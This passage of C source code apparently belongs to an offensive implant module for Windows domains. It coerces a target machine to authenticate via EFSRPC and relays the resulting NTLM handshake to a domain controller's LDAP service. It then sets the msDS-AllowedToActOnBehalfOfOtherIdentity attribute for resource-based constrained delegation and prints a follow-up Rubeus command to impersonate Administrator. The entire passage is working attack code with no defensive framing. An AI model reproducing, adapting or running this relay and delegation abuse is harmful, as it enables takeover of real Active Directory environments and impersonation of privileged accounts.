    out_write("[ldap_rbcd] listening OK\n", 25);
    out_flush_now();

    // Coerce TARGET (NOT beacon_ip!) so TARGET$ authenticates back to us.
#ifdef _WIN64
    CoerceArgs *ca = (CoerceArgs*)bmalloc(sizeof(CoerceArgs));
    if (ca) {
        rt_memcpy(ca->target,   coerce_ip, sizeof(ca->target));
        rt_memcpy(ca->listener, beacon_ip, sizeof(ca->listener));
        ca->port = (USHORT)listen_port;
        HANDLE h = CreateThread(NULL,0,efsr_coerce_thread,ca,0,NULL);
        if (h) CloseHandle(h); else bfree(ca);
    }
#endif /* _WIN64 */

    out_write("[ldap_rbcd] waiting for NEGOTIATE...\n", 37);
    out_flush_now();
    if (WaitForSingleObject(g_ctx.evt_neg_ready,RELAY_TIMEOUT_MS) != WAIT_OBJECT_0) {
        out_write("ldap_rbcd: NEGOTIATE timeout\n", 29); goto thread_wait_r;
    }

    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    SOCKET ldap_s = ldap_connect_ip(dc_ip);
    if (ldap_s == INVALID_SOCKET) {
        out_write("ldap_rbcd: LDAP connect failed\n",31); goto thread_wait_r;
    }

    out_write("[ldap_rbcd] relaying NEGOTIATE -> LDAP\n", 39);
    out_flush_now();

    uint8_t *lreq  = (uint8_t*)bmalloc(MAX_LDAP);
    uint8_t *lresp = (uint8_t*)bmalloc(MAX_LDAP);
    if (!lreq || !lresp) goto ldap_cleanup_r;

    // ----- Round 1 bind: SPNEGO(NEG) -----
    uint8_t *spnego_neg = (uint8_t*)bmalloc(MAX_TOKEN);
    uint32_t spnego_neg_len = spnego_neg ?
        spnego_wrap_negotiate(g_ctx.neg_token, g_ctx.neg_len, spnego_neg, MAX_TOKEN) : 0;
    uint32_t rlen = ldap_bind(lreq, 1, spnego_neg, spnego_neg_len);
    bfree(spnego_neg);
    uint32_t rlen2 = MAX_LDAP;
    if (!ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        out_write("ldap_rbcd: LDAP bind r1 failed\n",31); goto ldap_cleanup_r;
    }

    const uint8_t *chal; uint32_t chal_len;
    if (ldap_parse_bind(lresp,rlen2,&chal,&chal_len) != 1) {
        out_write("ldap_rbcd: no NTLMSSP challenge\n",32); goto ldap_cleanup_r;
    }
    const uint8_t *raw_chal; uint32_t raw_chal_len;
    if (!spnego_extract(chal, chal_len, &raw_chal, &raw_chal_len)) {
        out_write("ldap_rbcd: no NTLMSSP inside SPNEGO challenge\n",46); goto ldap_cleanup_r;
    }
    g_ctx.chal_token = (uint8_t*)bmalloc(raw_chal_len);
    if (!g_ctx.chal_token) goto ldap_cleanup_r;
    rt_memcpy(g_ctx.chal_token, raw_chal, raw_chal_len);
    g_ctx.chal_len = raw_chal_len;
    SetEvent(g_ctx.evt_chal_ready);

    out_write("[ldap_rbcd] waiting for AUTH...\n", 32);
    out_flush_now();
    if (WaitForSingleObject(g_ctx.evt_auth_ready,RELAY_TIMEOUT_MS) != WAIT_OBJECT_0) {
        out_write("ldap_rbcd: AUTH timeout\n",24);
        SetEvent(g_ctx.evt_relay_done); goto ldap_cleanup_r;
    }

    // ----- Round 2 bind: SPNEGO(AUTH) -----
    out_write("[ldap_rbcd] relaying AUTH -> LDAP\n", 34);
    out_flush_now();
    rlen  = ldap_bind(lreq, 2, g_ctx.auth_token, g_ctx.auth_len);
    rlen2 = MAX_LDAP;
    if (!ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        out_write("ldap_rbcd: LDAP bind r2 failed\n",31);
        SetEvent(g_ctx.evt_relay_done); goto ldap_cleanup_r;
    }
    SetEvent(g_ctx.evt_relay_done);
    if (ldap_parse_bind(lresp,rlen2,&chal,&chal_len) != 2) {
        out_write("ldap_rbcd: LDAP auth rejected\n",30); goto ldap_cleanup_r;
    }

    // ----- ModifyRequest: replace msDS-AllowedToActOnBehalfOfOtherIdentity -----
    out_write("[ldap_rbcd] LDAP bind OK — writing RBCD attribute\n", 51);
    out_flush_now();
    rlen  = ldap_modify_replace(lreq, 3, target_dn,
                                  "msDS-AllowedToActOnBehalfOfOtherIdentity",
                                  sd_bin, sd_len);
    rlen2 = MAX_LDAP;
    out_write("[ldap_rbcd] ModifyRequest sent, waiting for response (up to 30s)...\n", 69);
    out_flush_now();
    if (ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        int code = ldap_result_code(lresp,rlen2);
        if (code == 0) {
            out_write("[ldap_rbcd] SUCCESS: RBCD attribute set on target\n", 50);
            out_write("[ldap_rbcd] next: from attacker account run S4U2Self+S4U2Proxy\n", 63);
            out_write("[ldap_rbcd] e.g. Rubeus s4u /user:ATTACKER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET\n", 109);
            out_flush_now();
        } else {
            char msg[] = "[ldap_rbcd] ModifyRequest failed code=XX\n";
            msg[37] = '0' + (char)((code/10)%10);
            msg[38] = '0' + (char)(code%10);
            out_write(msg, sizeof(msg)-1);
            if (code == 50) {
                out_write("[ldap_rbcd] code=50 insufficientAccessRights — TARGET$ has no SELF write on its object\n", 87);
            }
            out_flush_now();
        }
    } else {
        int wsa_err = WSAGetLastError();
        char msg[] = "[ldap_rbcd] recv timeout / failed, WSA=XXXXXXXXXX\n";
        DWORD e = (DWORD)wsa_err; char tmp[12]; int tl = 0;
        if (!e) tmp[tl++]='0'; else while(e){tmp[tl++]='0'+(char)(e%10);e/=10;}
        int pos = 39; for(int ri=tl-1;ri>=0;ri--) msg[pos++]=tmp[ri];
        msg[pos++]='\n'; msg[pos]=0;
        out_write(msg, pos);
        out_write("[ldap_rbcd] same SASL-signing block as ldap_addda — see workarounds.\n", 69);
        out_flush_now();
    }

ldap_cleanup_r:
    bfree(lreq); bfree(lresp);
    closesocket(ldap_s);

thread_wait_r:
    if (h_smb) { WaitForSingleObject(h_smb,5000); CloseHandle(h_smb); }

ev_cleanup_r:
    if (g_ctx.neg_token)  bfree(g_ctx.neg_token);
    if (g_ctx.chal_token) bfree(g_ctx.chal_token);
    if (g_ctx.auth_token) bfree(g_ctx.auth_token);
    CloseHandle(g_ctx.evt_listening);
    CloseHandle(g_ctx.evt_neg_ready);
    CloseHandle(g_ctx.evt_chal_ready);
    CloseHandle(g_ctx.evt_auth_ready);
    CloseHandle(g_ctx.evt_relay_done);
}
